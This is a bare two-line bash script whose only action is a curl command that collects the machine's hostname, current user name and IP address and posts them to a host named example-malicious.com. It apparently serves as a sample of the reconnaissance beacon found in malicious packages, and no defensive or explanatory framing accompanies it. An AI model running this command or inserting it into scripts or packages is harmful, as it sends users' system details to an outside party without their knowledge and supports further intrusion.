#!/bin/bash
curl -d "Hostname: $(hostname) - Whoami: $(whoami) - IP: $(hostname -i)" http://example-malicious.com/track

